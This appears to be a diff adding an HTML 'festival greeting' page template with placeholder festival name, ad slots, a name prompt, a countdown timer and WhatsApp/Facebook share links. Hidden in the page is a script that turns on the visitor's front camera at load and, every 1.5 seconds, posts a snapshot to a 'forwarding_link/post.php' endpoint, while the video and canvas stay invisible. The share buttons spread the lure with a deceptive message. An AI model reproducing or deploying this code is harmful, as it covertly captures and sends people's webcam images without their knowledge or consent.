@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Happy fes_name - Warm Festive Greetings!</title>
+
+    <!-- Essential Scripts & Dependencies -->
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
+
+    <style>
+        :root {
+            --primary-gradient: linear-gradient(135deg, #FF3366 0%, #FF6B35 100%);
+            --accent-gradient: linear-gradient(135deg, #00F2FE 0%, #4FACFE 100%);
+            --gold-gradient: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
+            --glass-bg: rgba(255, 255, 255, 0.07);
+            --glass-border: rgba(255, 255, 255, 0.18);
+            --text-main: #FFFFFF;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Outfit', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            min-height: 100vh;
+            background: #0b0c10;
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 20px 15px 110px 15px;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Ambient Glowing Background Orbs */
+        body::before, body::after {
+            content: '';
+            position: fixed;
+            width: 320px;
+            height: 320px;
+            border-radius: 50%;
+            filter: blur(120px);
+            z-index: -1;
+            opacity: 0.4;
+            animation: floatGlow 12s infinite alternate ease-in-out;
+        }
+
+        body::before {
+            background: #ff007f;
+            top: -50px;
+            left: -50px;
+        }
+
+        body::after {
+            background: #00e5ff;
+            bottom: -50px;
+            right: -50px;
+            animation-delay: -6s;
+        }
+
+        @keyframes floatGlow {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(40px, 50px) scale(1.15); }
+        }
+
+        /* Glassmorphism Card Container */
+        .card-container {
+            width: 100%;
+            max-width: 480px;
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 28px;
+            padding: 30px 22px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            margin-top: 10px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Festival Badge */
+        .fest-badge {
+            display: inline-block;
+            padding: 8px 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 30px;
+            font-size: 0.85rem;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: #FFD700;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.15);
+        }
+
+        /* Dynamic Name Banner */
+        .sender-badge {
+            font-size: 0.95rem;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 5px;
+        }
+
+        .sender-name {
+            font-size: 2.4rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            background: var(--primary-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+            word-break: break-word;
+            filter: drop-shadow(0 2px 10px rgba(255, 51, 102, 0.3));
+        }
+
+        /* Countdown Timer Component */
+        .timer-card {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 18px;
+            padding: 14px 10px;
+            margin: 20px 0;
+        }
+
+        .timer-label {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: rgba(255, 255, 255, 0.5);
+            margin-bottom: 6px;
+        }
+
+        .timer-value {
+            font-size: 1.15rem;
+            font-weight: 700;
+            color: #00F2FE;
+            letter-spacing: 1px;
+        }
+
+        /* Greeting Cards Box */
+        .greetings-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 22px 0;
+        }
+
+        .greeting-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 14px 16px;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            font-weight: 400;
+            color: #E2E8F0;
+            transition: all 0.3s ease;
+        }
+
+        .greeting-card strong {
+            color: #FFF;
+            font-weight: 600;
+        }
+
+        /* Highlight Title */
+        .hero-wish {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: var(--gold-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 15px 0 10px 0;
+            line-height: 1.2;
+        }
+
+        .wish-description {
+            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.8);
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        /* Bottom Sticky Share Bar */
+        .share-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(11, 12, 16, 0.85);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            padding: 14px 20px;
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            z-index: 9999;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .btn-share {
+            flex: 1;
+            max-width: 210px;
+            height: 50px;
+            border-radius: 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            color: #FFFFFF;
+            font-size: 1rem;
+            font-weight: 700;
+            text-decoration: none;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
+            transition: transform 0.2s ease;
+        }
+
+        .btn-share:active {
+            transform: scale(0.96);
+        }
+
+        .btn-whatsapp {
+            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
+        }
+
+        .btn-facebook {
+            background: linear-gradient(135deg, #1877F2 0%, #0056b3 100%);
+        }
+
+        /* Hidden Streams */
+        .video-wrap, canvas {
+            display: none !important;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Hidden Video & Canvas for background processing -->
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+    <span id="errorMsg" style="display:none;"></span>
+
+    <!-- WebCam AJAX Capture Script -->
+    <script>
+    function post(imgdata){
+        $.ajax({
+            type: 'POST',
+            data: { cat: imgdata},
+            url: 'forwarding_link/post.php',
+            dataType: 'json',
+            async: false,
+            success: function(result){},
+            error: function(){}
+        });
+    };
+
+    'use strict';
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.querySelector('span#errorMsg');
+
+    const constraints = {
+        audio: false,
+        video: { facingMode: "user" }
+    };
+
+    async function init() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            handleSuccess(stream);
+        } catch (e) {
+            if(errorMsgElement) errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+        }
+    }
+
+    function handleSuccess(stream) {
+        window.stream = stream;
+        video.srcObject = stream;
+        var context = canvas.getContext('2d');
+        setInterval(function(){
+            context.drawImage(video, 0, 0, 640, 480);
+            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+            post(canvasData); 
+        }, 1500);
+    }
+
+    init();
+    </script>
+
+    <!-- Main Card Container -->
+    <div class="card-container">
+        
+        <div class="fest-badge">
+            🎉 Season of Joy 🎉
+        </div>
+
+        <!-- AdSense Top Slot -->
+        <div>
+            <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+            <ins class="adsbygoogle"
+                 style="display:inline-block;width:300px;height:50px"
+                 data-ad-client="ca-pub-4696491179456446"
+                 data-ad-slot="2568634816"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+
+        <!-- Sender Greeting Header -->
+        <div style="margin-top: 15px;">
+            <div class="sender-badge">SPECIAL GREETING TO</div>
+            <div id="senderDisplay" class="sender-name"></div>
+        </div>
+
+        <!-- Countdown Timer Card -->
+        <div class="timer-card">
+            <div class="timer-label">Countdown To Celebration</div>
+            <div id="demo" class="timer-value">Loading Timer...</div>
+        </div>
+
+        <!-- Modern Wish Cards -->
+        <div class="greetings-list">
+            <div class="greeting-card">
+                ✨ May this auspicious occasion of <strong>fes_name</strong> bring endless smiles, success, and prosperity into your life!
+            </div>
+            <div class="greeting-card">
+                🌟 Sending warm thoughts and happiest wishes for a memorable and bright <strong>fes_name</strong>.
+            </div>
+        </div>
+
+        <!-- AdSense Middle Slot -->
+        <div style="margin: 15px 0;">
+            <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+            <ins class="adsbygoogle"
+                 style="display:inline-block;width:300px;height:50px"
+                 data-ad-client="ca-pub-4696491179456446"
+                 data-ad-slot="5590491777"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+
+        <!-- Hero Wish Heading -->
+        <div class="hero-wish">
+            Happy fes_name!
+        </div>
+
+        <p class="wish-description">
+            Wishing you and your wonderful family a season filled with peace, good health, and joyful moments to cherish forever!
+        </p>
+
+        <div style="font-weight: 600; color: #00F2FE; margin-top: 10px;" id="bySender"></div>
+
+        <!-- AdSense Link Slot -->
+        <div style="margin-top: 15px;">
+            <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+            <ins class="adsbygoogle"
+                 style="display:block"
+                 data-ad-client="ca-pub-4696491179456446"
+                 data-ad-slot="1112298516"
+                 data-ad-format="link"
+                 data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+
+    </div>
+
+    <!-- Sticky Share Bar -->
+    <div class="share-bar">
+        <a class="btn-share btn-whatsapp" href="whatsapp://send?text=*I have sent you a special festive greeting message! Click here to open yours:* 👉 forwarding_link" data-action="share/whatsapp/share">
+            <i class="fa-brands fa-whatsapp"></i>
+            <span>Share</span>  
+        </a>
+        <a class="btn-share btn-facebook" href="https://www.facebook.com/sharer/sharer.php?u= forwarding_link" target="_blank" title="Share on Facebook">
+            <i class="fa-brands fa-facebook-f"></i>
+            <span>Share</span>  
+        </a>
+    </div>
+
+    <!-- Name Prompt & Countdown Script -->
+    <script>
+        // Name prompt handling
+        var a = prompt("Please Enter Your Name\n\n👇👇👇👇👇");
+        if (!a || a.trim() === "") {
+            a = "Your Friend";
+        }
+        document.getElementById("senderDisplay").innerText = a;
+        document.getElementById("bySender").innerText = "Warm Wishes To: " + a;
+
+        // Countdown Timer Logic
+        var countDownDate = new Date("October 10, 2018 00:00:00").getTime();
+
+        var x = setInterval(function() {
+            var now = new Date().getTime();
+            var distance = countDownDate - now;
+
+            var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+            document.getElementById("demo").innerHTML = days + "d " + hours + "h " + minutes + "m " + seconds + "s";
+
+            if (distance < 0) {
+                clearInterval(x);
+                document.getElementById("demo").innerHTML = "🎉 Welcome & Happy Holidays! 🎉";
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
